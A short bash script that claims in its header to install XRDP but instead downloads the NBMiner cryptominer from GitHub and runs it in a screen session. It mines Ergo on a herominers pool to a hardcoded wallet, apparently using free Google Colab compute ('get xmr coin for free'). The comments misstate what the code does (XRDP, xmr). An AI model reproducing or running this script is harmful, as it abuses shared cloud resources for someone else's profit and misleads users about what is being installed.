#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz
tar -zxvf NBMiner_40.1_Linux.tgz
cd NBMiner_Linux
./nbminer -a ergo -o stratum+tcp://de.ergo.herominers.com:1180 -u 9fJrbPRzyqPgHaKjDR8TPbvD1vBWEaw5PxcYo9tcRmXrC7ku9i3.worker
